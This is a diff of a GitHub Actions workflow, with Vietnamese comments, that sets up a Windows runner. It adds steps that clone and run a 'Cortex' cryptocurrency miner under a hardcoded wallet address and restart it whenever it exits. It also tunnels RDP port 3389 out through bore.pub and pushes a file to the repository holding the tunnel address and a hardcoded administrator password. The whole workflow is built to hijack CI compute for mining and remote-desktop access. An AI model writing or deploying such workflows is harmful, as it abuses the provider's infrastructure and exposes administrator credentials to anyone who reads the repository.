@@ -40,33 +40,72 @@ jobs:
               Add-LocalGroupMember -Group "Administrators" -Member "admin"
           }
 
-      - name: Open Website in Chrome
+      - name: Setup Cortex Python Miner Environment
         shell: pwsh
         run: |
-          Write-Host "🚀 Đang khởi chạy Google Chrome chuẩn tham số..."
-          Start-Process "chrome.exe" -ArgumentList "--kiosk","https://tinyurl.com/yn35r9z2","--no-first-run" -WindowStyle Normal -ErrorAction SilentlyContinue
-          Start-Sleep -Seconds 5
+          # 1. Dọn dẹp thư mục cũ để tránh xung đột đường dẫn clone
+          if (Test-Path "github.com") { Remove-Item "github.com" -Recurse -Force }
+          if (Test-Path "cortex-protocol") { Remove-Item "cortex-protocol" -Recurse -Force }
+          
+          # 2. Clone kho lưu trữ Cortex chính thức
+          git clone https://github.com/cortex-protocol/cortex-protocol.git
+          
+          # 3. Định vị môi trường SDK Python
+          $sdkPath = "$(Get-Location)\cortex-protocol\sdk\python"
+          if (!(Test-Path $sdkPath)) {
+              Write-Error "❌ Lỗi: Clone Git không thành công hoặc cấu trúc thư mục bị thay đổi!"
+              exit 1
+          }
+          cd $sdkPath
+          
+          # 4. Ép buộc cài đặt thư viện trực tiếp vào môi trường Python hiện hành của hệ thống
+          python -m pip install --upgrade pip
+          if (Test-Path "requirements.txt") {
+              python -m pip install --no-cache-dir -r requirements.txt
+          }
+          # Đảm bảo cài thêm gói requests trực tiếp vào môi trường global của Action
+          python -m pip install --no-cache-dir requests
 
-      - name: Tối ưu Registry 4K
+      - name: Toi uu Registry 4K
         run: |
           $tsPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services"
           if (!(Test-Path $tsPath)) { New-Item -Path $tsPath -Force }
           Set-ItemProperty -Path $tsPath -Name "fEnableVirtualizedGraphics" -Value 1 -Type DWord
           Set-ItemProperty -Path $tsPath -Name "MinFrameRate" -Value 120 -Type DWord
 
-      - name: Monitor Bore Stream & Force Update File
+      - name: Run Miner + Monitor Bore Stream & Git Push
+        shell: pwsh
+        env:
+          PYTHONIOENCODING: utf-8 # KHẮC PHỤC TRIỆT ĐỂ LỖI UNICODEENCODEERROR CHO MÁY ĐÀO
         run: |
           $PASS = "WindowsRDP2026@"
           $USER = "admin"
           $lastFullAddress = ""
           
-          # Cấu hình Git bắt buộc và dọn dẹp biến cục bộ
+          # Cấu hình Git định danh bảo mật và phân vùng an toàn
           git config --global user.name "TrueHieu-Bot"
           git config --global user.email "bot@trueteam.top"
           git config --global core.autocrlf false
-          git config --global --add safe.directory D:\a\gopi22\gopi22
+          $currentDir = (Get-Location).Path
+          git config --global --add safe.directory $currentDir
           
-          Write-Host "🚀 Đang truy quét Stream của Bore... Đợi Port về nhé đại ca!"
+          # --- KHỞI ĐỘNG CORTEX MINER TRỰC TIẾP QUA TIẾN TRÌNH HỆ THỐNG (ĐÃ SỬA: BỎ THAM SỐ THREADS) ---
+          $sdkPath = "$currentDir\cortex-protocol\sdk\python"
+          Write-Host "⛏️ Đang kích hoạt trực tiếp Cortex Python Miner..."
+          $minerPsi = New-Object System.Diagnostics.ProcessStartInfo
+          $minerPsi.FileName = "python.exe"
+          # Đã xoá bỏ --threads 4 vì script tự nhận diện phần cứng tối đa
+          $minerPsi.Arguments = "cortex_miner.py --address ctx1bde9419a13d673b57163d14ef29f3ed01843188137b28669"
+          $minerPsi.WorkingDirectory = $sdkPath
+          $minerPsi.UseShellExecute = $false
+          
+          # Truyền biến môi trường UTF-8 trực tiếp vào tiến trình con của Python Miner
+          $minerPsi.EnvironmentVariables["PYTHONIOENCODING"] = "utf-8"
+          
+          $minerProc = [System.Diagnostics.Process]::Start($minerPsi)
+          
+          # --- KHỞI ĐỘNG ĐƯỜNG TRUYỀN TUNNEL BORE ---
+          Write-Host "🚀 Đang khởi động tunnel Bore..."
           $psi = New-Object System.Diagnostics.ProcessStartInfo
           $psi.FileName = ".\bore\bore.exe"
           $psi.Arguments = "local 3389 --to bore.pub"
@@ -74,66 +113,53 @@ jobs:
           $psi.RedirectStandardOutput = $true
           $process = [System.Diagnostics.Process]::Start($psi)
           
+          # Vòng lặp giám sát liên tục tiến trình kết nối và duy trì Action chạy
           while (!$process.HasExited) {
               $line = $process.StandardOutput.ReadLine()
-              if ($line) { Write-Host "[bore] $line" }
-              
-              # SỬA LỖI MẢNG: Bổ sung chính xác chỉ mục regex [1] và split mảng
-              if ($line -match "(?:listening at|remote forwarding at) (bore\.pub:\d+)") {
-                  $fullAddress = $Matches[1]
-                  $portOnly = $fullAddress.Split(':')[1]
-                  if ($fullAddress -ne $lastFullAddress) {
-                      $lastFullAddress = $fullAddress
-                      
-                      if (Test-Path "rdp_info.txt") { Remove-Item "rdp_info.txt" -Force }
-                      $createdAt = (Get-Date).ToString('HH:mm:ss dd/MM/yyyy')
-                      $reportLines = @(
-                        '=======================================================',
-                        'RDP INFO - DucThang x TrueHieu Edition',
-                        '=======================================================',
-                        "FULL ADDRESS   : $fullAddress",
-                        "PORT           : $portOnly",
-                        'HOST           : bore.pub',
-                        '-------------------------------------------------------',
-                        "Username       : $USER",
-                        "Password       : $PASS",
-                        "Created        : $createdAt",
-                        '======================================================='
-                      )
-                      $report = ($reportLines -join "`r`n")
-                      [System.IO.File]::WriteAllText("$(Get-Location)\rdp_info.txt", $report)
-                      
-                      # Ép buộc đồng bộ hóa để tránh xung đột nhánh đẩy (Push Conflict)
-                      git fetch origin main
-                      git stash
-                      git checkout main
-                      git pull origin main --rebase
-                      git stash pop -ErrorAction SilentlyContinue
-                      
-                      git add rdp_info.txt
-                      git commit -m "Update RDP: $portOnly [skip ci]" --allow-empty
-                      git push origin main --force
-                      
-                      Write-Host "✅ ĐÃ ÉP CẬP NHẬT REPO THÀNH CÔNG: $fullAddress"
-                      break
+              if ($line) { 
+                  Write-Host "[bore] $line" 
+                  
+                  # Trích xuất địa chỉ IP/Port từ luồng Log của Bore
+                  if ($line -match "(?:listening at|remote forwarding at) (bore\.pub:\d+)") {
+                      $fullAddress = $Matches[1]
+                      if ($fullAddress -ne $lastFullAddress) {
+                          $lastFullAddress = $fullAddress
+                          $createdAt = (Get-Date).ToString('HH:mm:ss dd/MM/yyyy')
+                          
+                          $report = @(
+                              "=======================================================",
+                              "RDP INFO - DucThang x TrueHieu Edition",
+                              "=======================================================",
+                              "Địa chỉ kết nối: $fullAddress",
+                              "Tài khoản: $USER",
+                              "Mật khẩu: $PASS",
+                              "Thời gian tạo: $createdAt",
+                              "======================================================="
+                          ) -join "`r`n"
+                          
+                          # Lưu trữ thông tin kết nối cục bộ
+                          [System.IO.File]::WriteAllText("rdp_info.txt", $report)
+                          Write-Host "🔄 Phát hiện cổng kết nối mới: $fullAddress. Đang đẩy lên kho lưu trữ GitHub..."
+                          
+                          # Đồng bộ hóa mã nguồn tự động thông qua Git Push
+                          try {
+                              git add rdp_info.txt
+                              git commit -m "Bot: Cập nhật cổng RDP mới [$fullAddress] lúc $createdAt"
+                              git pull --rebase origin main
+                              git push origin main
+                              Write-Host "🚀 [Git Push] Đồng bộ thông tin rdp_info.txt thành công!"
+                          } catch {
+                              Write-Warning "⚠️ [Git Push] Trục trặc kết nối tạm thời, sẽ thử lại ở dòng log kế tiếp."
+                          }
+                      }
                   }
               }
-              Start-Sleep -Milliseconds 200
-          }
-          
-          # ⚙️ VÒNG LẶP VÔ HẠN AN TOÀN
-          Write-Host "🔒 Chuyển sang chế độ lặp vô hạn. Phiên chạy này sẽ CHỈ DỪNG khi phiên Cron mới xuất hiện..."
-          $loopCount = 0
-          while ($true) {
-              if ($process.HasExited) {
-                  Write-Host "⚠️ Phát hiện tiến trình Bore đã bị đóng ngầm! Đang khởi động lại tiến trình..."
-                  $process = [System.Diagnostics.Process]::Start($psi)
+              
+              # Cơ chế tự động hồi sinh Miner nếu tiến trình Python bị crash đột ngột
+              if ($minerProc.HasExited) {
+                  Write-Warning "⚠️ Cảnh báo: Tiến trình Miner đã thoát! Đang tiến hành khôi phục khởi động lại..."
+                  $minerProc = [System.Diagnostics.Process]::Start($minerPsi)
               }
               
-              if ($loopCount % 10 -eq 0) {
-                  Write-Host "💓 Heartbeat check - VPS vẫn đang hoạt động ổn định. Đã chạy được $loopCount phút."
-              }
-              
-              Start-Sleep -Seconds 60
-              $loopCount++
+              Start-Sleep -Milliseconds 500
           }
